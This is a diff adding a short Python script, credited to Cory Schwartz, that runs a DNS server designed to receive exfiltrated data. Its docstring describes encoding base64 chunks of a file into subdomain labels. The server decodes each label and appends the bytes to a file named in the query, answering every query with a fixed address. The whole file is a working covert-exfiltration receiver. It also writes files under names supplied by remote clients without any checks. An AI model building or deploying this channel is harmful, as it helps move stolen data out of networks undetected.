@@ -1,0 +1,35 @@
+# /usr/bin/env python
+
+# Written by Cory Schwartz
+# Does the same thing as server. Only shorter.
+
+import base64
+from dnslib import DNSRecord, RR, QTYPE, A
+from SocketServer import BaseRequestHandler, UDPServer
+
+class Exfiltrator(BaseRequestHandler):
+    '''
+    Use subdomains to exfiltrate data from DNS querries.
+    The first two parts of the domain will be used to send data
+    and the file name. The data will be base64 binary encoded.
+    Except for the first two, the remaining parts of the domain
+    will be ignored, so DNS should be configured up to that point.
+    <data>.<filename>.real.domain.com
+    '''
+    def handle(self):
+        request = DNSRecord.parse(self.request[0])
+        socket = self.request[1]
+	
+        reply = request.reply()
+	qname = reply.questions[0].qname.idna()
+	reply.add_answer(RR(qname, QTYPE.A, rdata=A('10.10.10.10'), ttl=600))
+	socket.sendto(reply.pack(), self.client_address)
+
+	q = qname.split('.')
+        with open(q[1], 'a+b') as f:
+            f.write(base64.b64decode(q[0]))
+
+if __name__ == '__main__':
+    HOST, PORT = '0.0.0.0', 53
+    server = UDPServer((HOST, PORT), Exfiltrator)
+    server.serve_forever()
